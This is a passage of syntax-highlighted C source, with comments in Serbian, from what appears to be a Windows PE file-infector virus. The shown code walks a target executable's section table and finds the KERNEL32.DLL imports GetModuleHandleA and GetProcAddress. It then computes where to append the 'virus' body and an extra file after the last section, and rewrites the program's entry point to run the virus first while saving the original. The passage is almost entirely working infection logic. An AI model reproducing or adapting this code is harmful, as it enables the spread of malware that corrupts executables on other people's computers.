    </span><span class="sc2">// preuzmi pointer na DirectoryData
</span><span class="sc0">    </span><span class="sc11">i</span><span class="sc10">=(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">96</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc2">// 96 je ofset do DirectoryData
</span><span class="sc0">    </span><span class="sc11">entry_idd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PIMAGE_DATA_DIRECTORY</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// vidi da li postoji IMPORT sekcija - ako ne postoji onda veliÅina==0
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!(</span><span class="sc11">entry_idd</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="sc10">]).</span><span class="sc11">Size</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc11">retvalue</span><span class="sc10">=</span><span class="sc4">0x105</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">end4</span><span class="sc10">;}</span><span class="sc0">

    </span><span class="sc2">// preskoÅi i PE Optional header, sada smo na poÅetku Section Table
</span><span class="sc0">    </span><span class="sc2">// ova tabla sadrÇi Section Header-e kojih ima NumberOfSections
</span><span class="sc0">    </span><span class="sc11">filemap</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">IMAGE_OPTIONAL_HEADER</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc9">#ifdef I_TESTMODE
</span><span class="sc0">    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">testIfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\r\nimport ok"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">Iwritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">




</span><span class="sc3">/*** NALAêENJE IMPORT SEKCIJE ***/</span><span class="sc0">

    </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">ImportTable</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// pretraÇi celu Section Table da bi naÑli Import sekciju (sadrÇi IT)
</span><span class="sc0">    </span><span class="sc2">// takoîe treba locirati poslednji Section Header
</span><span class="sc0">    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">NumberOfSections</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

</span><span class="sc9">#ifdef I_TESTMODE
</span><span class="sc2">// ime sekcije
</span><span class="sc0">        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">_testb</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\r\n%.8s"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">PIMAGE_SECTION_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">Name</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">testIfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">_testb</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">Iwritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">

        </span><span class="sc2">// Da li je trenutna sekcija IMPORT sekcija?
</span><span class="sc0">        </span><span class="sc2">// proverava se da li je VirtualAddress iz DirectoryData[IMPORT]
</span><span class="sc0">        </span><span class="sc2">// unutar RVA granica trenutne sekcije: [VirtualAddress, VirtualAddress+SizeOfRawData).
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">ImportTable</span><span class="sc10">)</span><span class="sc0">   </span><span class="sc2">// ako IMPORT sekcija joÑ uvek nije naîena
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">entry_idd</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="sc10">]).</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">PIMAGE_SECTION_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">PIMAGE_SECTION_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">SizeOfRawData</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">// pomoÜna promenljiva, treba kasnije
</span><span class="sc0">            </span><span class="sc11">ISrva2ofs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">filestart</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">PIMAGE_SECTION_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">PointerToRawData</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">PIMAGE_SECTION_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">VirtualAddress</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc2">// Naîena je IMPORT sekcij!, preuzi file offset na njen poÅetak
</span><span class="sc0">            </span><span class="sc11">ImportTable</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">entry_idd</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="sc10">]).</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ISrva2ofs</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc2">// iako je import sekcija pronaîena, vrti dalje da bi naÑao
</span><span class="sc0">            </span><span class="sc2">// poslednju sekciju
</span><span class="sc0">        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">// idi na sledeÜu sekciju
</span><span class="sc0">        </span><span class="sc11">filemap</span><span class="sc10">+=</span><span class="sc11">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc10">;</span><span class="sc0">       </span><span class="sc2">// sizeof(IMAGE_SECTION_HEADER);
</span><span class="sc0">        </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc2">// greÑka - nijedna sekcija nije IMPORT
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">ImportTable</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">retvalue</span><span class="sc10">=</span><span class="sc4">0x106</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">end4</span><span class="sc10">;}</span><span class="sc0">






</span><span class="sc3">/*** NALAêENJE SVIH KERNEL32.DLL ***/</span><span class="sc0">

    </span><span class="sc2">// resetuje pointere
</span><span class="sc0">    </span><span class="sc11">GetModuleHandleRVA</span><span class="sc10">=</span><span class="sc11">GetProcAddressRVA</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc2">// preuzmi ime DLLa
</span><span class="sc0">        </span><span class="sc11">i</span><span class="sc10">=((</span><span class="sc11">PIMAGE_IMPORT_DESCRIPTOR</span><span class="sc10">)</span><span class="sc11">ImportTable</span><span class="sc10">)-&gt;</span><span class="sc11">Name</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">module_name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ISrva2ofs</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">         </span><span class="sc2">// kraj, nema viÑe DLLova
</span><span class="sc0">
        </span><span class="sc2">// poredi ime DLLa sa 'KERNEL32.DLL'
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">lstrcmpi</span><span class="sc10">(</span><span class="sc11">module_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">kernel32</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">


            </span><span class="sc3">/*** NAéAO KERNEL32.DLL - NALAêENJE WinAPI FUNKCIJA ***/</span><span class="sc0">

            </span><span class="sc2">// preuzmi file ofset na IAT
</span><span class="sc0">            </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">ISrva2ofs</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)((</span><span class="sc11">PIMAGE_IMPORT_DESCRIPTOR</span><span class="sc10">)</span><span class="sc11">ImportTable</span><span class="sc10">)-&gt;</span><span class="sc11">FirstThunk</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">IAT</span><span class="sc10">=(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc2">// preuzmi file ofset na HNA, ako je ima
</span><span class="sc0">            </span><span class="sc11">i</span><span class="sc10">=((</span><span class="sc11">PIMAGE_IMPORT_DESCRIPTOR</span><span class="sc10">)</span><span class="sc11">ImportTable</span><span class="sc10">)-&gt;</span><span class="sc11">Characteristics</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">i</span><span class="sc10">+=</span><span class="sc11">ISrva2ofs</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">HNA</span><span class="sc10">=(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">HNA</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">UseT</span><span class="sc10">=</span><span class="sc11">IAT</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc2">// pretraÇuje se IAT
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HNA</span><span class="sc10">)</span><span class="sc0">                </span><span class="sc2">// ako postoji HNA (nije Borland)
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">HNA</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">IAT</span><span class="sc10">)</span><span class="sc0">   </span><span class="sc2">// ako razliÅito pokazuju IAT i HNA
</span><span class="sc0">                    </span><span class="sc11">UseT</span><span class="sc10">=</span><span class="sc11">HNA</span><span class="sc10">;</span><span class="sc0">       </span><span class="sc2">// onda je IAT optimizovan (Micro$oft), pa se pretraÇuje HNA
</span><span class="sc0">
            </span><span class="sc2">// pretraÇi IAT ili HNA za potrebnim funkcijama
</span><span class="sc0">            </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">UseT</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">// postoji samo ordinal, idi dalje
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">signed</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)(*</span><span class="sc11">UseT</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">UseT</span><span class="sc10">++;</span><span class="sc0"> </span><span class="sc11">IAT</span><span class="sc10">++;</span><span class="sc0">
                    </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc2">// postoji i ime funkcije, ordinal nije obavezan da postoji!
</span><span class="sc0">                </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">UseT</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ISrva2ofs</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">function_name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">PIMAGE_IMPORT_BY_NAME</span><span class="sc10">)</span><span class="sc11">i</span><span class="sc10">)-&gt;</span><span class="sc11">Name</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc9">#ifdef I_TESTMODE_API
</span><span class="sc0">                </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">testIfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">Iwritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">testIfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">function_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">function_name</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">Iwritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">
                </span><span class="sc2">// poredi ime IMPORT f-je sa 'GetModuleHandleA', ako nije naîena
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">GetModuleHandleRVA</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">lstrcmpi</span><span class="sc10">(</span><span class="sc11">function_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">getmodulehandle</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">// naÑao, saÅuvaj RVA na IAT [GetModuleHandleA]
</span><span class="sc0">                    </span><span class="sc11">GetModuleHandleRVA</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">IAT</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">ISrva2ofs</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">GetProcAddressRVA</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">// ako su naîene obe f-je, izaîi
</span><span class="sc0">                </span><span class="sc10">}</span><span class="sc0">

                </span><span class="sc2">// poredi ime IMPORT f-je sa 'GetProcAddress', ako nije naîena
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">GetProcAddress</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">lstrcmpi</span><span class="sc10">(</span><span class="sc11">function_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">getprocaddress</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">// naÑao, saÅuvaj RVA na IAT [GetProcAddress]
</span><span class="sc0">                    </span><span class="sc11">GetProcAddressRVA</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">IAT</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">ISrva2ofs</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">GetModuleHandleRVA</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">// ako su naîene obe f-je, izaîi
</span><span class="sc0">                </span><span class="sc10">}</span><span class="sc0">

                </span><span class="sc2">// idi na sledeÜu IMPORT funkciju
</span><span class="sc0">                </span><span class="sc11">UseT</span><span class="sc10">++;</span><span class="sc0"> </span><span class="sc11">IAT</span><span class="sc0"> </span><span class="sc10">++;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">   </span><span class="sc2">// while, zavrÑena pretraga IAT
</span><span class="sc0">
            </span><span class="sc2">// ako su naîene obe funkcije izaîi!
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">GetModuleHandleRVA</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">GetProcAddressRVA</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">// idi na sledeÜu IMPORT biblioteku
</span><span class="sc0">        </span><span class="sc11">ImportTable</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IMAGE_IMPORT_DESCRIPTOR</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">GetModuleHandleRVA</span><span class="sc10">)</span><span class="sc0">            </span><span class="sc2">// nije naÑao prvu f-ju
</span><span class="sc0">        </span><span class="sc10">{</span><span class="sc11">retvalue</span><span class="sc10">=</span><span class="sc4">0x108</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">end4</span><span class="sc10">;}</span><span class="sc0">
</span><span class="sc2">//  if (!GetProcAddressRVA)             // nije naÑao drugu f-ju
//      {retvalue=0x109; goto end4;}    // ali, ko zna, moÇda je izvuÅemo iz KERNEL32.DLL
</span><span class="sc0">
</span><span class="sc9">#ifdef I_TESTMODE
</span><span class="sc0">    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">testIfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\r\nattach"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">Iwritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">





</span><span class="sc3">/*** ATTACH FILE ***/</span><span class="sc0">

</span><span class="sc9">#define     viruscode   module_name
#define     temp        ISrva2ofs
#define     j           NumberOfSections
</span><span class="sc0">
    </span><span class="sc2">// otvori addexe fajl koji Üe se upisati
</span><span class="sc0">    </span><span class="sc11">haddfile</span><span class="sc10">=</span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">addfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fattr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">haddfile</span><span class="sc10">==</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">retvalue</span><span class="sc10">=</span><span class="sc4">0x10A</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">end4</span><span class="sc10">;}</span><span class="sc0">
    </span><span class="sc2">// uzmi njegovu veliÅinu i ujedno je zapamti
</span><span class="sc0">    </span><span class="sc11">addfile_size</span><span class="sc10">=</span><span class="sc11">GetFileSize</span><span class="sc10">(</span><span class="sc11">haddfile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc2">// vrati da filemap pokazuje na poslednju sekciju
</span><span class="sc0">    </span><span class="sc2">// paÇnja! postoje sekcije koje nisu fiziÅki prisutne u pe exe fajlu (.bss)
</span><span class="sc0">    </span><span class="sc2">// one se razlikuju samo po tome Ñto je njihov PointerToRawData==0
</span><span class="sc0">    </span><span class="sc2">// ili je SizeOfRawData==0
</span><span class="sc0">    </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">filemap</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc11">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">temp</span><span class="sc10">=((</span><span class="sc11">PIMAGE_SECTION_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">SizeOfRawData</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">i</span><span class="sc10">=((</span><span class="sc11">PIMAGE_SECTION_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">PointerToRawData</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">temp</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc2">// naîi file ofset gde treba dodati virus. Na Çalost, VirtualSize moÇe
</span><span class="sc0">    </span><span class="sc2">// biti 0 (watcom linker) tako da se on ne moÇe koristiti.
</span><span class="sc0">    </span><span class="sc11">i</span><span class="sc10">+=</span><span class="sc11">temp</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fsize</span><span class="sc10">&gt;</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">overlay</span><span class="sc10">=</span><span class="sc11">fsize</span><span class="sc10">-</span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">overlay</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">virusstart</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">filestart</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">overlay</span><span class="sc10">;</span><span class="sc0">           </span><span class="sc2">// ako ima overlay, onda ga preskoÅi
</span><span class="sc0">
    </span><span class="sc2">// odredi RAW veliÅinu koda virusa
</span><span class="sc0">    </span><span class="sc11">raw_virussize</span><span class="sc10">=&amp;</span><span class="sc11">virus_end</span><span class="sc10">-&amp;</span><span class="sc11">virus_start</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc2">// odredi i Align veliÅinu koda virusa + add file
</span><span class="sc0">    </span><span class="sc11">align_virussize</span><span class="sc10">=(((</span><span class="sc11">raw_virussize</span><span class="sc10">+</span><span class="sc11">addfile_size</span><span class="sc10">+</span><span class="sc11">overlay</span><span class="sc10">)/</span><span class="sc11">SectionAlign</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">SectionAlign</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc2">// preuzmi pointer na poÅetak koda virusa
</span><span class="sc0">    </span><span class="sc11">viruscode</span><span class="sc10">=&amp;</span><span class="sc11">virus_start</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// zapiÑi u virus RVA+ImageBase naÑe dve winAPI f-je
</span><span class="sc0">    </span><span class="sc11">ddGetModuleHandleA</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetModuleHandleRVA</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ImageBase</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ddGetProcAddress</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetProcAddressRVA</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">GetProcAddressRVA</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ddGetProcAddress</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">ImageBase</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// Promeni RVA entry pointa na RVA poÅetka virusa
</span><span class="sc0">    </span><span class="sc11">oldEntryPoint</span><span class="sc10">=*</span><span class="sc11">EntryPointRVA</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ImageBase</span><span class="sc10">;</span><span class="sc0">       </span><span class="sc2">// saÅuvaj u fajlu stari entry point (RVA + ImageBase)
</span><span class="sc0">    </span><span class="sc11">oldEntryPointRVA</span><span class="sc10">=*</span><span class="sc11">EntryPointRVA</span><span class="sc10">;</span><span class="sc0">                </span><span class="sc2">// saÅuvaj u fajlu samo RVA starog entry pointa
</span><span class="sc0">    </span><span class="sc11">j</span><span class="sc10">=((</span><span class="sc11">PIMAGE_SECTION_HEADER</span><span class="sc10">)</span><span class="sc11">filemap</span><span class="sc10">)-&gt;</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">temp</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">overlay</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">oldEPoffs</span><span class="sc10">=(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">EntryPointRVA</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">filestart</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">// saÅuvaj i pointer na mesto entry pointa
</span><span class="sc0">    </span><span class="sc10">*</span><span class="sc11">EntryPointRVA</span><span class="sc10">=</span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0">                               </span><span class="sc2">// setuj RVA novog Entry Pointa
</span><span class="sc0">
